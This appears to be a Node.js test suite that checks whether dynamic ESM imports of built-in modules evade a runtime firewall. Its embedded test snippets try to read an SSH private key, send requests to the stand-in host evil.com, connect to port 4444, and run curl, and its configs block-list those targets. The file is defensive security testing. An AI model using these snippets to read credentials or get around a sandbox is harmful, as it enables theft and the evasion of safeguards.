/**
 * ESM Built-in Bypass Tests
 * Tests whether dynamic import('node:*') can bypass firewall interception
 */

const {
  setupTestDir,
  cleanupTestDir,
  writeMinimalConfig,
  runWithFirewall,
  isBlocked,
  TestTracker
} = require('../utils');

async function runEsmBypassTests() {
  const tracker = new TestTracker('esm-bypass');
  
  console.log('\n════════════════════════════════════════════════════════════');
  console.log('[ESM] ESM BUILT-IN BYPASS TESTS');
  console.log('════════════════════════════════════════════════════════════\n');
  
  console.log('Testing if dynamic import("node:*") can bypass firewall...\n');
  
  // Detect Node.js version for ESM dynamic import support
  const nodeMajorVersion = parseInt(process.versions.node.split('.')[0]);
  const supportsESMHooks = nodeMajorVersion >= 20;
  
  // =========================================================================
  // FILESYSTEM BYPASSES
  // =========================================================================
  console.log('--- Filesystem (node:fs) ---\n');
  
  await tracker.runTest('node:fs - dynamic import bypasses blockedReadPaths', async () => {
    const testDir = setupTestDir('esm-fs-bypass');
    
    try {
      writeMinimalConfig(testDir, {
        filesystem: {
          blockedReadPaths: ['/.ssh/'],
          blockedWritePaths: [],
          allowedPaths: []
        }
      });
      
      const code = `
        (async () => {
          try {
            const fs = await import('node:fs');
            const content = fs.readFileSync('/.ssh/id_rsa', 'utf8');
            console.log('ESM_FS_BYPASS_SUCCESS');
          } catch (e) {
            console.log('ESM_FS_BLOCKED:' + e.message);
          }
        })();
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('ESM_FS_BLOCKED'),
        reason: result.output.includes('ESM_FS_BYPASS_SUCCESS') ? 'BYPASS: node:fs not intercepted' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // NETWORK BYPASSES
  // =========================================================================
  console.log('\n--- Network (node:http, node:https, node:net) ---\n');
  
  await tracker.runTest('node:http - dynamic import bypasses blockedDomains', async () => {
    // Skip on Node.js 18 - ESM hooks not supported (register() API added in Node.js 20.6.0)
    if (!supportsESMHooks) {
      return { pass: true, reason: 'skipped (Node.js 18 - ESM hooks not supported)', skipped: true };
    }
    
    const testDir = setupTestDir('esm-http-bypass');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['evil.com'],
          allowedDomains: []
        }
      });
      
      const code = `
        (async () => {
          try {
            const http = await import('node:http');
            const req = http.request({
              hostname: 'evil.com',
              port: 80,
              path: '/',
              method: 'GET'
            }, (res) => {
              console.log('ESM_HTTP_BYPASS_SUCCESS');
            });
            req.on('error', (e) => {
              console.log('ESM_HTTP_BLOCKED:' + e.message);
            });
            req.end();
            setTimeout(() => process.exit(0), 2000);
          } catch (e) {
            console.log('ESM_HTTP_BLOCKED:' + e.message);
          }
        })();
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('ESM_HTTP_BLOCKED'),
        reason: result.output.includes('ESM_HTTP_BYPASS_SUCCESS') ? 'BYPASS: node:http not intercepted' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  await tracker.runTest('node:https - dynamic import bypasses blockedDomains', async () => {
    const testDir = setupTestDir('esm-https-bypass');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['evil.com'],
          allowedDomains: []
        }
      });
      
      const code = `
        (async () => {
          try {
            const https = await import('node:https');
            const req = https.request({
              hostname: 'evil.com',
              port: 443,
              path: '/',
              method: 'GET'
            }, (res) => {
              console.log('ESM_HTTPS_BYPASS_SUCCESS');
            });
            req.on('error', (e) => {
              console.log('ESM_HTTPS_BLOCKED:' + e.message);
            });
            req.end();
            setTimeout(() => process.exit(0), 2000);
          } catch (e) {
            console.log('ESM_HTTPS_BLOCKED:' + e.message);
          }
        })();
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('ESM_HTTPS_BLOCKED'),
        reason: result.output.includes('ESM_HTTPS_BYPASS_SUCCESS') ? 'BYPASS: node:https not intercepted' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  await tracker.runTest('node:net - dynamic import bypasses network rules', async () => {
    const testDir = setupTestDir('esm-net-bypass');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          suspiciousPorts: [4444],
          allowedDomains: []
        }
      });
      
      const code = `
        (async () => {
          try {
            const net = await import('node:net');
            const client = net.connect({ host: '127.0.0.1', port: 4444 }, () => {
              console.log('ESM_NET_BYPASS_SUCCESS');
              client.end();
            });
            client.on('error', (e) => {
              console.log('ESM_NET_BLOCKED:' + e.message);
            });
            setTimeout(() => process.exit(0), 2000);
          } catch (e) {
            console.log('ESM_NET_BLOCKED:' + e.message);
          }
        })();
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('ESM_NET_BLOCKED'),
        reason: result.output.includes('ESM_NET_BYPASS_SUCCESS') ? 'BYPASS: node:net not intercepted' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // CHILD PROCESS BYPASSES
  // =========================================================================
  console.log('\n--- Child Process (node:child_process) ---\n');
  
  await tracker.runTest('node:child_process - dynamic import bypasses blockedPatterns', async () => {
    const testDir = setupTestDir('esm-child-process-bypass');
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [
            { pattern: 'curl', severity: 'high', description: 'Download' }
          ],
          allowedCommands: []
        }
      });
      
      const code = `
        (async () => {
          try {
            const cp = await import('node:child_process');
            cp.exec('curl http://evil.com', (err, stdout, stderr) => {
              if (err) {
                console.log('ESM_CP_BLOCKED:' + err.message);
              } else {
                console.log('ESM_CP_BYPASS_SUCCESS');
              }
            });
            setTimeout(() => process.exit(0), 2000);
          } catch (e) {
            console.log('ESM_CP_BLOCKED:' + e.message);
          }
        })();
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('ESM_CP_BLOCKED'),
        reason: result.output.includes('ESM_CP_BYPASS_SUCCESS') ? 'BYPASS: node:child_process not intercepted' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // OTHER CRITICAL BUILTINS
  // =========================================================================
  console.log('\n--- Other Critical Builtins ---\n');
  
  await tracker.runTest('node:fs/promises - dynamic import bypasses blockedReadPaths', async () => {
    const testDir = setupTestDir('esm-fs-promises-bypass');
    
    try {
      writeMinimalConfig(testDir, {
        filesystem: {
          blockedReadPaths: ['/.ssh/'],
          blockedWritePaths: [],
          allowedPaths: []
        }
      });
      
      const code = `
        (async () => {
          try {
            const fs = await import('node:fs/promises');
            const content = await fs.readFile('/.ssh/id_rsa', 'utf8');
            console.log('ESM_FS_PROMISES_BYPASS_SUCCESS');
          } catch (e) {
            console.log('ESM_FS_PROMISES_BLOCKED:' + e.message);
          }
        })();
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('ESM_FS_PROMISES_BLOCKED'),
        reason: result.output.includes('ESM_FS_PROMISES_BYPASS_SUCCESS') ? 'BYPASS: node:fs/promises not intercepted' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  return tracker.getSummary();
}

module.exports = { runEsmBypassTests };

// Allow direct execution
if (require.main === module) {
  runEsmBypassTests().then(summary => {
    console.log('\nESM Bypass Tests Summary:');
    console.log(`  Passed: ${summary.passed}`);
    console.log(`  Failed: ${summary.failed}`);
    console.log(`  Skipped: ${summary.skipped}`);
    process.exit(summary.failed > 0 ? 1 : 0);
  });
}
